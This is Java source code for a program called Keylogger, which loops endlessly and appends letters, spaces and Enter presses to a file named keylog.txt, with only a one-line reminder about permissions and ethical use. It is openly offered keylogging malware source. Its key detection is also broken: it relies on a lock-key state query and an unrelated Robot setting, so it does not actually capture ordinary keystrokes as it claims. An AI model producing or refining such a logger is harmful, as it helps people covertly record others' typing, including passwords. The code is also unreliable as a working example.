import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.FileWriter;
import java.io.IOException;
public class Keylogger {
    private static final String LOG_FILE = "keylog.txt";
    public static void main(String[] args) {
        System.out.println("Keylogger started. Ensure proper permissions and ethical use!");
        System.out.println("Logs will be saved to " + LOG_FILE);
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            Robot robot = new Robot();
            boolean[] keyState = new boolean[256]; // Track key states
            while (true) {
                for (int keyCode = KeyEvent.VK_A; keyCode <= KeyEvent.VK_Z; keyCode++) {
                    if (isKeyPressed(robot, keyCode) && !keyState[keyCode]) {
                        writer.write((char) keyCode);
                        writer.flush();
                        keyState[keyCode] = true;
                    } else if (!isKeyPressed(robot, keyCode)) {
                        keyState[keyCode] = false;
                    }
                }
                
                if (isKeyPressed(robot, KeyEvent.VK_SPACE) && !keyState[KeyEvent.VK_SPACE]) {
                    writer.write(" ");
                    writer.flush();
                    keyState[KeyEvent.VK_SPACE] = true;
                } else if (!isKeyPressed(robot, KeyEvent.VK_SPACE)) {
                    keyState[KeyEvent.VK_SPACE] = false;
                }
                if (isKeyPressed(robot, KeyEvent.VK_ENTER) && !keyState[KeyEvent.VK_ENTER]) {
                    writer.write("[ENTER]\n");
                    writer.flush();
                    keyState[KeyEvent.VK_ENTER] = true;
                } else if (!isKeyPressed(robot, KeyEvent.VK_ENTER)) {
                    keyState[KeyEvent.VK_ENTER] = false;
                }
                Thread.sleep(10); 
            }
        } catch (AWTException | IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
    private static boolean isKeyPressed(Robot robot, int keyCode) {
        return robot.isAutoWaitForIdle() && Toolkit.getDefaultToolkit().getLockingKeyState(keyCode);
    }
}
